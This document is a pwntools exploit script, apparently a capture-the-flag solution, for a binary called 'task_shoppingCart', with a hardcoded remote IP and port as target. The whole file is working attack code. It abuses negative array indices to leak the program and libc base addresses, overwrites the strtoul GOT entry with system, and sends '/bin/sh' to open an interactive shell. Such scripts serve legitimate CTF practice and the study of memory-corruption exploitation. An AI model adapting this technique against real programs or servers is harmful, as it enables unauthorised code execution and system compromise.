#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./task_shoppingCart"
elf=ELF(pwn_file)
libc=elf.libc
#libc=ELF("./libc.so.6")
#heap_add=0
#stack_add=0
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("49.4.79.184",30645)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    #log.debug("stack add:0x%x"%stack_add)
    #log.debug("heap add:0x%x"%heap_add)
    log.debug("libc add:0x%x"%libc.address)
    log.debug("pie address: 0x%x"%elf.address)
    pause()

def add(size,name):
    r.sendlineafter("Now, buy buy buy!\n","1")
    r.sendlineafter("How long is your goods name?",str(size))
    r.sendafter("What is your goods name?",name)

def dele(idx):
    r.sendlineafter("Now, buy buy buy!\n","2")
    r.sendlineafter("Which goods that you don't need?\n",str(idx))

def edit(idx,buf):
    r.sendlineafter("Now, buy buy buy!\n","3")
    r.sendlineafter("Which goods you need to modify?\n",str(idx&0xffffffffffffffff))
    r.recvuntil("OK, what would you like to modify ")
    con=r.recvuntil(" to")[:-3]
    r.send(buf)
    return con

def add_money(buf):
    r.sendlineafter("EMMmmm, you will be a rich man!\n","1")
    r.sendlineafter("RMB or Dollar?\n",buf)

def out():
    r.sendlineafter("EMMmmm, you will be a rich man!\n","3")

add_money(p64(0xdeadbeef))
add_money(p64(0xdeadbeef))
add_money(p64(0xdeadbeef))
for i in range(17):
    add_money(p64(0xdeadbeef))
out()
elf.address=u64(edit(-47,"\x68").ljust(8,"\x00"))-0x202068
edit(-1,p64(0x202148+elf.address))
edit(-21,p64(elf.got["strtoul"]))

r.sendlineafter("Now, buy buy buy!\n","3")
r.sendlineafter("Which goods you need to modify?\n",str((-19)&0xffffffffffffffff))
r.recvuntil("OK, what would you like to modify ")
con=r.recvuntil(" to")[:-3]
libc.address=u64(con.ljust(8,"\x00"))-libc.sym["strtoul"]
r.send(p64(libc.sym["system"]))
r.sendline("/bin/sh\x00")
r.interactive()





